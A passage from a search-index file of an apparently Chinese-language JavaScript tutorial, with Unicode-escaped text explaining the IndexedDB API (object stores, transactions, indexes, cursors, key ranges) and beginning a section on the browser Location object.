\uff0c\u5bf9\u4e8e\u6709\u591a\u4e2a\u503c\u7684\u4e3b\u952e\u6570\u7ec4\uff0c\u6bcf\u4e2a\u503c\u5c06\u5728\u7d22\u5f15\u91cc\u9762\u65b0\u5efa\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u4e3b\u952e\u6570\u7ec4\u5bf9\u5e94\u4e00\u4e2a\u6761\u76ee\u3002 \u5047\u5b9a\u5bf9\u8c61\u4ed3\u5e93\u4e2d\u7684\u6570\u636e\u8bb0\u5f55\u90fd\u662f\u5982\u4e0b\u7684 person \u7c7b\u578b\u3002 1 2 3 4 5 var person = { name : name , email : email , created : new Date () }; \u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u6765\u5efa\u7acb\u7d22\u5f15\u3002 1 2 3 4 var store = db . createObjectStore ( 'people' , { autoIncrement : true }); store . createIndex ( 'name' , 'name' , { unique : false }); store . createIndex ( 'email' , 'email' , { unique : true }); \u4e0a\u9762\u4ee3\u7801\u544a\u8bc9\u7d22\u5f15\u5bf9\u8c61\uff0c name \u5c5e\u6027\u4e0d\u662f\u552f\u4e00\u503c\uff0c email \u5c5e\u6027\u662f\u552f\u4e00\u503c\u3002 \uff0812\uff09IDBObjectStore.deleteIndex() IDBObjectStore.deleteIndex() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u7684\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 VersionChange \u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002 1 objectStore . deleteIndex ( indexName ) \uff0813\uff09IDBObjectStore.openCursor() IDBObjectStore.openCursor() \u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u6307\u9488\u5bf9\u8c61\u3002 1 IDBObjectStore . openCursor () \u6307\u9488\u5bf9\u8c61\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6570\u636e\u3002\u8be5\u5bf9\u8c61\u4e5f\u662f\u5f02\u6b65\u7684\uff0c\u6709\u81ea\u5df1\u7684 success \u548c error \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u5bf9\u5b83\u4eec\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var t = db . transaction ([ 'test' ], 'readonly' ); var store = t . objectStore ( 'test' ); var cursor = store . openCursor (); cursor . onsuccess = function ( event ) { var res = event . target . result ; if ( res ) { console . log ( 'Key' , res . key ); console . dir ( 'Data' , res . value ); res . continue (); } } \u76d1\u542c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5bf9\u8c61\u7684 target.result \u5c5e\u6027\u6307\u5411\u5f53\u524d\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u8bb0\u5f55\u7684 key \u548c value \u5206\u522b\u8fd4\u56de\u4e3b\u952e\u548c\u952e\u503c\uff08\u5373\u5b9e\u9645\u5b58\u5165\u7684\u6570\u636e\uff09\u3002 continue() \u65b9\u6cd5\u5c06\u5149\u6807\u79fb\u5230\u4e0b\u4e00\u4e2a\u6570\u636e\u5bf9\u8c61\uff0c\u5982\u679c\u5f53\u524d\u6570\u636e\u5bf9\u8c61\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2a\u6570\u636e\u4e86\uff0c\u5219\u5149\u6807\u6307\u5411 null \u3002 openCursor() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\u503c\uff0c\u6216\u8005\u4e00\u4e2a IDBKeyRange \u5bf9\u8c61\u3002\u5982\u679c\u6307\u5b9a\u8be5\u53c2\u6570\uff0c\u5c06\u53ea\u5904\u7406\u5305\u542b\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\uff1b\u5982\u679c\u7701\u7565\uff0c\u5c06\u5904\u7406\u6240\u6709\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u904d\u5386\u65b9\u5411\uff0c\u9ed8\u8ba4\u503c\u4e3a next \uff0c\u5176\u4ed6\u53ef\u80fd\u7684\u503c\u4e3a prev \u3001 nextunique \u548c prevunique \u3002\u540e\u4e24\u4e2a\u503c\u8868\u793a\u5982\u679c\u9047\u5230\u91cd\u590d\u503c\uff0c\u4f1a\u81ea\u52a8\u8df3\u8fc7\u3002 \uff0814\uff09IDBObjectStore.openKeyCursor() IDBObjectStore.openKeyCursor() \u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u4e3b\u952e\u6307\u9488\u5bf9\u8c61\u3002 1 IDBObjectStore . openKeyCursor ()","title":"\u65b9\u6cd5"},{"location":"bom/indexeddb/#idbtransaction","text":"IDBTransaction \u5bf9\u8c61\u7528\u6765\u5f02\u6b65\u64cd\u4f5c\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u6240\u6709\u7684\u8bfb\u5199\u64cd\u4f5c\u90fd\u8981\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u3002 IDBDatabase.transaction() \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; var transaction = db . transaction ([ 'demo' ], 'readwrite' ); transaction . oncomplete = function ( event ) { console . log ( 'transaction success' ); }; transaction . onerror = function ( event ) { console . log ( 'transaction error: ' + transaction . error ); }; var objectStore = transaction . objectStore ( 'demo' ); var objectStoreRequest = objectStore . add ({ foo : 1 }); objectStoreRequest . onsuccess = function ( event ) { console . log ( 'add data success' ); }; }; \u4e8b\u52a1\u7684\u6267\u884c\u987a\u5e8f\u662f\u6309\u7167\u521b\u5efa\u7684\u987a\u5e8f\uff0c\u800c\u4e0d\u662f\u53d1\u51fa\u8bf7\u6c42\u7684\u987a\u5e8f\u3002 1 2 3 4 5 6 var trans1 = db . transaction ( 'foo' , 'readwrite' ); var trans2 = db . transaction ( 'foo' , 'readwrite' ); var objectStore2 = trans2 . objectStore ( 'foo' ) var objectStore1 = trans1 . objectStore ( 'foo' ) objectStore2 . put ( '2' , 'key' ); objectStore1 . put ( '1' , 'key' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c key \u5bf9\u5e94\u7684\u952e\u503c\u6700\u7ec8\u662f 2 \uff0c\u800c\u4e0d\u662f 1 \u3002\u56e0\u4e3a\u4e8b\u52a1 trans1 \u5148\u4e8e trans2 \u521b\u5efa\uff0c\u6240\u4ee5\u9996\u5148\u6267\u884c\u3002 \u6ce8\u610f\uff0c\u4e8b\u52a1\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u53ea\u6709\u76d1\u542c\u5230\u4e8b\u52a1\u7684 complete \u4e8b\u4ef6\uff0c\u624d\u80fd\u4fdd\u8bc1\u4e8b\u52a1\u64cd\u4f5c\u6210\u529f\u3002 IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBTransaction.db \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u6240\u5728\u7684\u6570\u636e\u5e93\u5bf9\u8c61 IDBDatabase\u3002 IDBTransaction.error \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u9519\u8bef\u3002\u5982\u679c\u4e8b\u52a1\u6ca1\u6709\u7ed3\u675f\uff0c\u6216\u8005\u4e8b\u52a1\u6210\u529f\u7ed3\u675f\uff0c\u6216\u8005\u88ab\u624b\u52a8\u7ec8\u6b62\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de null \u3002 IDBTransaction.mode \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u6a21\u5f0f\uff0c\u9ed8\u8ba4\u662f readonly \uff08\u53ea\u8bfb\uff09\uff0c\u53e6\u4e00\u4e2a\u503c\u662f readwrite \u3002 IDBTransaction.objectStoreNames \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 DOMStringList\uff0c\u6210\u5458\u662f\u5f53\u524d\u4e8b\u52a1\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u5b57\u3002 IDBTransaction.onabort \uff1a\u6307\u5b9a abort \u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u65ad\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction.oncomplete \uff1a\u6307\u5b9a complete \u4e8b\u4ef6\uff08\u4e8b\u52a1\u6210\u529f\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\uff08\u4e8b\u52a1\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 IDBTransaction.abort() \uff1a\u7ec8\u6b62\u5f53\u524d\u4e8b\u52a1\uff0c\u56de\u6eda\u6240\u6709\u5df2\u7ecf\u8fdb\u884c\u7684\u53d8\u66f4\u3002 IDBTransaction.objectStore(name) \uff1a\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\u4ed3\u5e93 IDBObjectStore\u3002","title":"IDBTransaction \u5bf9\u8c61"},{"location":"bom/indexeddb/#idbindex","text":"IDBIndex \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u5e93\u7684\u7d22\u5f15\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u5e93\u91cc\u9762\u7684\u8bb0\u5f55\u3002\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u9ed8\u8ba4\u5c31\u662f\u5e26\u6709\u7d22\u5f15\uff0cIDBIndex \u5bf9\u8c61\u4e3b\u8981\u7528\u4e8e\u901a\u8fc7\u9664\u4e3b\u952e\u4ee5\u5916\u7684\u5176\u4ed6\u952e\uff0c\u5efa\u7acb\u7d22\u5f15\u83b7\u53d6\u5bf9\u8c61\u3002 IDBIndex \u662f\u6301\u4e45\u6027\u7684\u952e\u503c\u5bf9\u5b58\u50a8\u3002\u53ea\u8981\u63d2\u5165\u3001\u66f4\u65b0\u6216\u5220\u9664\u6570\u636e\u8bb0\u5f55\uff0c\u5f15\u7528\u7684\u5bf9\u8c61\u5e93\u4e2d\u7684\u8bb0\u5f55\uff0c\u7d22\u5f15\u5c31\u4f1a\u81ea\u52a8\u66f4\u65b0\u3002 IDBObjectStore.index() \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6 IDBIndex \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var transaction = db . transaction ([ 'contactsList' ], 'readonly' ); var objectStore = transaction . objectStore ( 'contactsList' ); var myIndex = objectStore . index ( 'lName' ); myIndex . openCursor (). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { var tableRow = document . createElement ( 'tr' ); tableRow . innerHTML = '<td>' + cursor . value . id + '</td>' + '<td>' + cursor . value . lName + '</td>' + '<td>' + cursor . value . fName + '</td>' + '<td>' + cursor . value . jTitle + '</td>' + '<td>' + cursor . value . company + '</td>' + '<td>' + cursor . value . eMail + '</td>' + '<td>' + cursor . value . phone + '</td>' + '<td>' + cursor . value . age + '</td>' ; tableEntry . appendChild ( tableRow ); cursor . continue (); } else { console . log ( 'Entries all displayed.' ); } }; IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBIndex.name \uff1a\u5b57\u7b26\u4e32\uff0c\u7d22\u5f15\u7684\u540d\u79f0\u3002 IDBIndex.objectStore \uff1a\u7d22\u5f15\u6240\u5728\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002 IDBIndex.keyPath \uff1a\u7d22\u5f15\u7684\u4e3b\u952e\u3002 IDBIndex.multiEntry \uff1a\u5e03\u5c14\u503c\uff0c\u9488\u5bf9 keyPath \u4e3a\u6570\u7ec4\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u521b\u5efa\u6570\u7ec4\u65f6\uff0c\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4f1a\u6709\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u6bcf\u4e2a\u6570\u7ec4\u90fd\u53ea\u6709\u4e00\u4e2a\u6761\u76ee\u3002 IDBIndex.unique \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u521b\u5efa\u7d22\u5f15\u65f6\u662f\u5426\u5141\u8bb8\u76f8\u540c\u7684\u4e3b\u952e\u3002 IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\uff0c\u5b83\u4eec\u90fd\u662f\u5f02\u6b65\u7684\uff0c\u7acb\u5373\u8fd4\u56de\u7684\u90fd\u662f\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 IDBIndex.count() \uff1a\u7528\u6765\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u53ea\u8fd4\u56de\u7b26\u5408\u4e3b\u952e\u7684\u8bb0\u5f55\u6570\u91cf\uff0c\u5426\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u7684\u6570\u91cf\u3002 IDBIndex.get(key) \uff1a\u7528\u6765\u83b7\u53d6\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u7684\u6570\u636e\u8bb0\u5f55\u3002 IDBIndex.getKey(key) \uff1a\u7528\u6765\u83b7\u53d6\u6307\u5b9a\u7684\u4e3b\u952e\u3002 IDBIndex.getAll() \uff1a\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684\u6570\u636e\u8bb0\u5f55\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u4e3b\u952e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u8fd4\u56de\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e24\u4e2a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u3002\u7531\u4e8e\u83b7\u53d6\u6210\u529f\u65f6\uff0c\u6d4f\u89c8\u5668\u5fc5\u987b\u751f\u6210\u6240\u6709\u5bf9\u8c61\uff0c\u6240\u4ee5\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\u3002\u5982\u679c\u6570\u636e\u96c6\u6bd4\u8f83\u5927\uff0c\u5efa\u8bae\u4f7f\u7528 IDBCursor \u5bf9\u8c61\u3002 IDBIndex.getAllKeys() \uff1a\u8be5\u65b9\u6cd5\u4e0e IDBIndex.getAll() \u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u83b7\u53d6\u6240\u6709\u4e3b\u952e\u3002 IDBIndex.openCursor() \uff1a\u7528\u6765\u83b7\u53d6\u4e00\u4e2a IDBCursor \u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u7d22\u5f15\u91cc\u9762\u7684\u6240\u6709\u6761\u76ee\u3002 IDBIndex.openKeyCursor() \uff1a\u8be5\u65b9\u6cd5\u4e0e IDBIndex.openCursor() \u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u904d\u5386\u6240\u6709\u6761\u76ee\u7684\u4e3b\u952e\u3002","title":"IDBIndex \u5bf9\u8c61"},{"location":"bom/indexeddb/#idbcursor","text":"IDBCursor \u5bf9\u8c61\u4ee3\u8868\u6307\u9488\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u6570\u636e\u4ed3\u5e93\uff08IDBObjectStore\uff09\u6216\u7d22\u5f15\uff08IDBIndex\uff09\u7684\u8bb0\u5f55\u3002 IDBCursor \u5bf9\u8c61\u4e00\u822c\u901a\u8fc7 IDBObjectStore.openCursor() \u65b9\u6cd5\u83b7\u5f97\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var transaction = db . transaction ([ 'rushAlbumList' ], 'readonly' ); var objectStore = transaction . objectStore ( 'rushAlbumList' ); objectStore . openCursor ( null , 'next' ). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { var listItem = document . createElement ( 'li' ); listItem . innerHTML = cursor . value . albumTitle + ', ' + cursor . value . year ; list . appendChild ( listItem ); console . log ( cursor . source ); cursor . continue (); } else { console . log ( 'Entries all displayed.' ); } }; IDBCursor \u5bf9\u8c61\u7684\u5c5e\u6027\u3002 IDBCursor.source \uff1a\u8fd4\u56de\u6b63\u5728\u904d\u5386\u7684\u5bf9\u8c61\u4ed3\u5e93\u6216\u7d22\u5f15\u3002 IDBCursor.direction \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6307\u9488\u904d\u5386\u7684\u65b9\u5411\u3002\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1anext\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff09\u3001nextunique\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3001prev\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff09\u3001prevunique\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3002\u8be5\u5c5e\u6027\u901a\u8fc7 IDBObjectStore.openCursor() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\uff0c\u4e00\u65e6\u6307\u5b9a\u5c31\u4e0d\u80fd\u6539\u53d8\u4e86\u3002 IDBCursor.key \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002 IDBCursor.value \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u6570\u636e\u503c\u3002 IDBCursor.primaryKey \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002\u5bf9\u4e8e\u6570\u636e\u4ed3\u5e93\uff08objectStore\uff09\u6765\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u540c\u4e8e IDBCursor.key\uff1b\u5bf9\u4e8e\u7d22\u5f15\uff0cIDBCursor.key \u8fd4\u56de\u7d22\u5f15\u7684\u4f4d\u7f6e\u503c\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u3002 IDBCursor \u5bf9\u8c61\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 IDBCursor.advance(n) \uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8 n \u4e2a\u4f4d\u7f6e\u3002 IDBCursor.continue() \uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u4e3b\u952e\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u4f1a\u8df3\u8f6c\u5230\u8fd9\u4e2a\u4e3b\u952e\u3002 IDBCursor.continuePrimaryKey() \uff1a\u8be5\u65b9\u6cd5\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f key \uff0c\u7b2c\u4e8c\u4e2a\u662f primaryKey \uff0c\u5c06\u6307\u9488\u79fb\u5230\u7b26\u5408\u8fd9\u4e24\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002 IDBCursor.delete() \uff1a\u7528\u6765\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u6539\u53d8\u6307\u9488\u7684\u4f4d\u7f6e\u3002 IDBCursor.update() \uff1a\u7528\u6765\u66f4\u65b0\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u5b83\u7684\u53c2\u6570\u662f\u8981\u5199\u5165\u6570\u636e\u5e93\u7684\u65b0\u7684\u503c\u3002","title":"IDBCursor \u5bf9\u8c61"},{"location":"bom/indexeddb/#idbkeyrange","text":"IDBKeyRange \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u4ed3\u5e93\uff08object store\uff09\u91cc\u9762\u7684\u4e00\u7ec4\u4e3b\u952e\u3002\u6839\u636e\u8fd9\u7ec4\u4e3b\u952e\uff0c\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u4ed3\u5e93\u6216\u7d22\u5f15\u91cc\u9762\u7684\u4e00\u7ec4\u8bb0\u5f55\u3002 IDBKeyRange \u53ef\u4ee5\u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e0a\u9650\u548c\u4e0b\u9650\u3002\u5b83\u6709\u56db\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u6765\u6307\u5b9a\u4e3b\u952e\u7684\u8303\u56f4\u3002 IDBKeyRange.lowerBound() \uff1a\u6307\u5b9a\u4e0b\u9650\u3002 IDBKeyRange.upperBound() \uff1a\u6307\u5b9a\u4e0a\u9650\u3002 IDBKeyRange.bound() \uff1a\u540c\u65f6\u6307\u5b9a\u4e0a\u4e0b\u9650\u3002 IDBKeyRange.only() \uff1a\u6307\u5b9a\u53ea\u5305\u542b\u4e00\u4e2a\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4ee3\u7801\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // All keys \u2264 x var r1 = IDBKeyRange . upperBound ( x ); // All keys < x var r2 = IDBKeyRange . upperBound ( x , true ); // All keys \u2265 y var r3 = IDBKeyRange . lowerBound ( y ); // All keys > y var r4 = IDBKeyRange . lowerBound ( y , true ); // All keys \u2265 x && \u2264 y var r5 = IDBKeyRange . bound ( x , y ); // All keys > x &&< y var r6 = IDBKeyRange . bound ( x , y , true , true ); // All keys > x && \u2264 y var r7 = IDBKeyRange . bound ( x , y , true , false ); // All keys \u2265 x &&< y var r8 = IDBKeyRange . bound ( x , y , false , true ); // The key = z var r9 = IDBKeyRange . only ( z ); IDBKeyRange.lowerBound() \u3001 IDBKeyRange.upperBound() \u3001 IDBKeyRange.bound() \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u9ed8\u8ba4\u5305\u62ec\u7aef\u70b9\u503c\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4fee\u6539\u8fd9\u4e2a\u5c5e\u6027\u3002 \u4e0e\u4e4b\u5bf9\u5e94\uff0cIDBKeyRange \u5bf9\u8c61\u6709\u56db\u4e2a\u53ea\u8bfb\u5c5e\u6027\u3002 IDBKeyRange.lower \uff1a\u8fd4\u56de\u4e0b\u9650 IDBKeyRange.lowerOpen \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0b\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0b\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09 IDBKeyRange.upper \uff1a\u8fd4\u56de\u4e0a\u9650 IDBKeyRange.upperOpen \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0a\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0a\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09 IDBKeyRange \u5b9e\u4f8b\u5bf9\u8c61\u751f\u6210\u4ee5\u540e\uff0c\u5c06\u5b83\u4f5c\u4e3a\u53c2\u6570\u8f93\u5165 IDBObjectStore \u6216 IDBIndex \u5bf9\u8c61\u7684 openCursor() \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5728\u6240\u8bbe\u5b9a\u7684\u8303\u56f4\u5185\u8bfb\u53d6\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var t = db . transaction ([ 'people' ], 'readonly' ); var store = t . objectStore ( 'people' ); var index = store . index ( 'name' ); var range = IDBKeyRange . bound ( 'B' , 'D' ); index . openCursor ( range ). onsuccess = function ( e ) { var cursor = e . target . result ; if ( cursor ) { console . log ( cursor . key + ':' ); for ( var field in cursor . value ) { console . log ( cursor . value [ field ]); } cursor . continue (); } } IDBKeyRange \u6709\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5 includes(key) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u4e3b\u952e\u662f\u5426\u5305\u542b\u5728\u5f53\u524d\u8fd9\u4e2a\u4e3b\u952e\u7ec4\u4e4b\u5185\u3002 1 2 3 4 var keyRangeValue = IDBKeyRange . bound ( 'A' , 'K' , false , false ); keyRangeValue . includes ( 'F' ) // true keyRangeValue . includes ( 'W' ) // false","title":"IDBKeyRange \u5bf9\u8c61"},{"location":"bom/indexeddb/#_16","text":"Raymond Camden, Working With IndexedDB \u2013 Part 1 Raymond Camden, Working With IndexedDB \u2013 Part 2 Raymond Camden, Working With IndexedDB - Part 3 Tiffany Brown, An Introduction to IndexedDB David Fahlander, Breaking the Borders of IndexedDB TutorialsPoint, HTML5 - IndexedDB","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/location/","text":"Location \u5bf9\u8c61\uff0cURL \u5bf9\u8c61\uff0cURLSearchParams \u5bf9\u8c61 \u00b6 URL \u662f\u4e92\u8054\u7f51\u7684\u57fa\u7840\u8bbe\u65bd\u4e4b\u4e00\u3002\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u4e00\u4e9b\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u7ba1\u7406 URL\u3002 Location \u5bf9\u8c61 \u00b6 Location \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b URL \u76f8\u5173\u7684\u4fe1\u606f\u548c\u64cd\u4f5c\u65b9\u6cd5\u3002\u901a\u8fc7 window.location \u548c document.location \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002 \u5c5e\u6027 \u00b6 Location \u5bf9\u8c61\u63d0\u4f9b\u4ee5\u4e0b\u5c5e\u6027\u3002 Location.href \uff1a\u6574\u4e2a URL\u3002 Location.protocol \uff1a\u5f53\u524d URL \u7684\u534f\u8bae\uff0c\u5305\u62ec\u5192\u53f7\uff08 : \uff09\u3002 Location.host \uff1a\u4e3b\u673a\u3002\u5982\u679c\u7aef\u53e3\u4e0d\u662f\u534f\u8bae\u9ed8\u8ba4\u7684 80 \u548c 433 \uff0c\u5219\u8fd8\u4f1a\u5305\u62ec\u5192\u53f7\uff08 : \uff09\u548c\u7aef\u53e3\u3002 Location.hostname \uff1a\u4e3b\u673a\u540d\uff0c\u4e0d\u5305\u62ec\u7aef\u53e3\u3002 Location.port \uff1a\u7aef\u53e3\u53f7\u3002 Location.pathname \uff1aURL \u7684\u8def\u5f84\u90e8\u5206\uff0c\u4ece\u6839\u8def\u5f84 / \u5f00\u59cb\u3002 Location.search \uff1a\u67e5\u8be2\u5b57\u7b26\u4e32\u90e8\u5206\uff0c\u4ece\u95ee\u53f7 ? \u5f00\u59cb\u3002 Location.hash \uff1a\u7247\u6bb5\u5b57\u7b26\u4e32\u90e8\u5206\uff0c\u4ece # \u5f00\u59cb\u3002 Location.username \uff1a\u57df\u540d\u524d\u9762\u7684\u7528\u6237\u540d\u3002 Location.password \uff1a\u57df\u540d\u524d\u9762\u7684\u5bc6\u7801\u3002 Location.origin \uff1aURL \u7684\u534f\u8bae\u3001\u4e3b\u673a\u540d\u548c\u7aef\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // \u5f53\u524d\u7f51\u5740\u4e3a // http://user:passwd@www.example.com:4097/path/a.html?x=111#part1 document . location . href // \"http://user:passwd@www.example.com:4097/path/a.html?x=111#part1\" document . location . protocol // \"http:\" document . location . host // \"www.example.com:4097\" document . location . hostname // \"www.example.com\" document . location . port // \"4097\" document . location . pathname // \"/path/a.html\" document . location . search // \"?x=111\" document . location . hash // \"#part1\" document . location . username // \"user\" document . location . password // \"passwd\" document . location . origin // 